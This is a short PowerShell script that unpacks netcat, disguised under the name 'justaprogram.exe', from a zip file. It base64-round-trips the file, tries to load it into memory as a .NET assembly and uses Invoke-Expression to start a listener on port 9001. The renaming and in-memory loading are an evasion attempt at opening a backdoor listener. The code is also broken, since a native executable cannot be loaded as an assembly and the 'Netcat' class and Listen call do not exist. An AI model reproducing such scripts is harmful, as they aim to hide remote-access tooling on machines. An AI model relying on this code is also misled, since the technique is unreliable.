# Path to the zip file containing justaprogram.exe (nc.exe)
$zipFilePath = "C:\path\to\your\justaprogram.zip"

# Path to a temporary folder for extracting justaprogram.exe (nc.exe)
$tempExtractPath = "C:\path\to\temp\extract"

# Extract justaprogram.exe (nc.exe) from the zip file
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipFilePath, $tempExtractPath)

# Set the path to the extracted justaprogram.exe (nc.exe)
$justAProgramPath = Join-Path $tempExtractPath "justaprogram.exe"

# Read the contents of justaprogram.exe (nc.exe) and convert to base64
$content = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($justAProgramPath))

# Decode base64 and load justaprogram.exe (nc.exe) in memory
$decodedContent = [System.Convert]::FromBase64String($content)
$exeBytes = [System.Reflection.Assembly]::Load($decodedContent)

# Create a PowerShell script to execute justaprogram.exe (nc.exe) with a listener on port 9001
$scriptContent = @"
`$listenerPort = 9001
`$nc = `$exeBytes.CreateInstance('Netcat')
`$nc.Listen(`$listenerPort)
"@

# Invoke the script to start the listener
Invoke-Expression $scriptContent
